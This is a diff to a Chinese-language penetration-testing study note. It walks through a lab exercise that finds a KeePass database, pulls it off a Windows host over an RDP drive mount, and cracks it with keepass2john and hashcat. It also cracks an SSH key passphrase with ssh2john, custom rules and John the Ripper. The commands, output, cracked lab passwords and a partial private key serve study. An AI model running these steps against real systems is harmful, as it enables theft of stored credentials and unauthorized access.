@@ -3556,6 +3556,263 @@ Analyzing '19adc0e8921336d08502c039dc297ff8'
 ```
 
 ### Password Manager
-popular password managers include [1Password](https://1password.com/) and [KeePass](https://keepass.info/).
+Popular password managers include [1Password](https://1password.com/) and [KeePass](https://keepass.info/).
 
-Pentest 中，假設已經獲得密碼管理器的 client 的存取權限，將提取密碼管理器的資料庫，將檔案轉換為與 Hashcat 相容的格式，再破解主資料庫密碼
+Pentest 中，假設已經獲得密碼管理器的 client 的存取權限，將提取密碼管理器的資料庫 (如下圖安裝 KeePass)，將檔案轉換為與 Hashcat 相容的格式，再破解主資料庫密碼\
+![image](https://hackmd.io/_uploads/SyhWmXsKJe.png)
+
+#### 1. 尋找 KeePass database 儲存的檔案： .kdbx file
+遞迴尋找 `C:\` 路徑底下副檔名為 .kdbx 的檔案 
+```
+PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+
+    Directory: C:\Users\jason\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/30/2022  10:33 AM           1982 Database.kdbx
+```
+> `Get-ChildItem`：指定路徑下的所有檔案與資料夾\
+`-Path C:\`：目標路徑為整個 C:\ 
+`-Include *.kdbx`：篩選副檔名為 .kdbx 的檔案\
+`-File`：僅回傳檔案，不包含資料夾\
+`-Recurse`：遞迴方式搜尋\
+`-ErrorAction SilentlyContinue`：遇到權限不足、無法存取的資料夾時，不顯示 Error
+>> 結果顯示: `C:\Users\jason\Documents`路徑下
+
+![image](https://hackmd.io/_uploads/SyGQ87jtJx.png)
+
+#### 2. 使用 Hash 爆破工具
+- 將 rdp windows 上的 Database.kdbx 傳回 kali 進行爆破
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /u:jason /p:lab /v:192.168.209.203 /drive:myshare,/tmp
+```
+> 透過 xfreerdp 掛載 kali 本機資料夾\
+> kali /tmp 對應到 windows /myshare\
+> ![image](https://hackmd.io/_uploads/Hk6RsQoK1l.png)\
+> 在 windows 上會看到 /myshare，將 Database.kdbx 丟到 /myshare，再從 kali /tmp 取出
+
+>[!Note]
+> JtR（John the Ripper）套件包含多種腳本轉換，例如 [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py) 和 [keepass2john](https://github.com/openwall/john/blob/bleeding-jumbo/src/keepass2john.c)，可以將不同格式的檔案轉換為適合破解的雜湊格式
+
+```
+┌──(chw㉿CHW)-[~]
+└─$ keepass2john Database.kdbx > keepass.hash       
+
+┌──(chw㉿CHW)-[~]
+└─$ cat keepass.hash  
+Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+
+```
+> 正確 Hash format 不包含 "Database:"，刪除後就可以進行爆破\
+
+- 查詢 Hash 類型 
+[Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) 上查詢符合以上 Hash 的類型\
+![image](https://hackmd.io/_uploads/ryFG0Xst1g.png)
+或用 hashcat --help 查看
+```
+┌──(chw㉿CHW)-[~]
+└─$ hashcat --help | grep -i "KeePass"
+  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
+  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
+
+```
+> correct mode: `13400`
+
+- 開始爆破
+使用 `rockyou.txt` password，與 hashcat 預設的密碼規則 `rockyou-30000.rule --force` 進行爆破
+```
+┌──(chw㉿CHW)-[~]
+└─$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+hashcat (v6.2.6) starting
+
+...
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 3MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+...
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 430331550000
+* Runtime...: 1 sec
+..
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
+Hash.Target......: $keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d...7496c1
+
+...
+```
+> qwertyuiop123!
+
+#### 3. 開啟資料庫
+開啟 Open Database ，並用密碼登入\
+![image](https://hackmd.io/_uploads/HkGsgVjKyl.png)
+
+開啟 KeePass 後，可以成功存取所有用戶密碼
+![image](https://hackmd.io/_uploads/SyzWb4oKJg.png)
+
+### SSH Private Key Passphrase
+#### 1. 尋找 SSH Private Key
+通常透過 Path Traversal 來讀檔\
+這裡略過，直接從範例中下載 `id_rsa` 與`note.txt`
+![image](https://hackmd.io/_uploads/Hkxai4oKJg.png)
+```
+CWei@CHW-MacBook-Pro ~ % cat note.txt 
+Dave's password list:
+
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+
+Note to myself:
+New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
+CWei@CHW-MacBook-Pro ~ % cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBwWeeKjT
+dk6h6IP831kv63AAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDvrm3+hxV2
+g3cmlbup2vX0C/+WHtXTKaJwamj6K3BLBxjBRk5g0HzH05tUb5qJZCo2sFNids+7BvO5NJ
+89f9+1TSwh8KQvhzdMd1CXG6MFkx4Rpan27gFKHO45ml9Y/p5J8xvvmLOu5nwCWbBX1d8j
+...
+```
+> note.txt 是 dave 的 password list (現實沒這麼友善)
+> 👉🏻 嘗試用 password list 登入 SSH
+
+```
+CWei@CHW-MacBook-Pro ~ % chmod 600 id_rsa 
+CWei@CHW-MacBook-Pro ~ % ssh -i id_rsa -p 2222 dave@192.168.209.201
+Enter passphrase for key 'id_rsa': 
+Enter passphrase for key 'id_rsa': 
+Enter passphrase for key 'id_rsa': 
+..
+```
+> 使用 password list 都登入失敗
+
+>[!Note]
+> In a real penetration test we would keep these passwords on hand for various other vectors including spray attacks, or attacks against a dave user on other systems.
+
+#### 2. 使用 Hash 爆破工具
+- 將 id_rsa 轉換成 hash format
+
+```
+CWei@CHW-MacBook-Pro ssh2john % python3 ssh2john.py /Users/CWei/id_rsa > /Users/CWei/ssh.hash
+CWei@CHW-MacBook-Pro ssh2john % cat /Users/CWei/ssh.hash 
+/Users/CWei/id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010705
+```
+- 查詢 Hash 類型 
+[Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) 上查詢符合以上 Hash 的類型\
+![image](https://hackmd.io/_uploads/ryywrSjYyx.png)
+或用 hashcat --help 查看
+```
+CWei@CHW-MacBook-Pro ssh2john % hashcat -h | grep -i "ssh"
+...
+   1411 | SSHA-256(Base64), LDAP {SSHA256}                           | FTP, HTTP, SMTP, LDAP Server
+   1711 | SSHA-512(Base64), LDAP {SSHA512}                           | FTP, HTTP, SMTP, LDAP Server
+    111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                | FTP, HTTP, SMTP, LDAP Server
+  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                        | Enterprise Application Software (EAS)
+  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)                      | Private Key
+  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
+  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)                  | Private Key
+  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)                      | Private Key
+  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)                      | Private Key
+```
+>  `$6$` is mode 22921
+
+- 建立密碼規則
+```
+CWei@CHW-MacBook-Pro ~ % cat note.txt 
+...
+Note to myself:
+New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
+```
+> 包含三個數字、一個大寫字母和一個特殊字元
+
+Dave 在密碼中使用「137」三個數字。另外，「Window」密碼以大寫開頭。\
+先嘗試使用規則函數將首字變成大寫。並將最常見的特殊字元 `！`, `@` 和 `#`，因為它是鍵盤左側前三個特殊字元。
+
+撰寫規則
+```
+CWei@CHW-MacBook-Pro ~ % cat ssh.rule 
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+```
+
+- 開始爆破
+```
+CWei@CHW-MacBook-Pro ~ % hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --for
+ce
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+...
+Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
+
+* Token length exception: 1/1 hashes
+  This error happens if the wrong hash type is specified, if the hashes are
+  malformed, or if input is otherwise not as expected (for example, if the
+  --username option is used but no username is present)
+
+No hashes loaded.
+
+...
+```
+>[!Warning]
+>出現 Token length exception 錯誤:\
+>參考 [Hashcat 論壇](https://hashcat.net/forum/thread-10662.html)。現代的 SSH 私鑰及對應的密碼通常使用 `AES-256-CTR` 加密，而 hashcat 的模式 22921 不支援這種加密方式。因此 hashcat 無法正確處理 hash。
+
+但 John the Ripper (JtR) 也可以處理這種密碼。\
+為了能夠在 JtR 使用先前建立的規則，我們需要將規則新增到    `/etc/john/john.conf` 中。\
+[舉例] 使用「List.Rules」語法將該自訂規則命名 為sshRules。我們將使用 sudo 和 sh -c 將規則附加到 `/etc/john/john.conf` 中。\
+(需要更改 config ，我把環境移回 Kali )
+```                                        
+┌──(chw㉿CHW)-[~]
+└─$ cat ssh.rule                                   
+[List.Rules:sshRules]
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+                                                                                                
+┌──(chw㉿CHW)-[~]
+└─$ sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'
+[sudo] password for chw: 
+```
+
+將 sshRules 新增到 JtR 設定檔後，\
+ `--wordlist=ssh.passwords` 定義先前建立的wordlist\
+`--rules=sshRules` 選擇先前建立的規則\
+最後提供私鑰的 hash: `ssh.hash`
+```
+┌──(chw㉿CHW)-[~]
+└─$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+Created directory: /home/chw/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Umbrella137!     (?)     
+1g 0:00:00:01 DONE (2025-02-13 05:39) 0.7692g/s 13.84p/s 13.84c/s 13.84C/s Window137!..Umbrella137#
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+> Umbrella137!
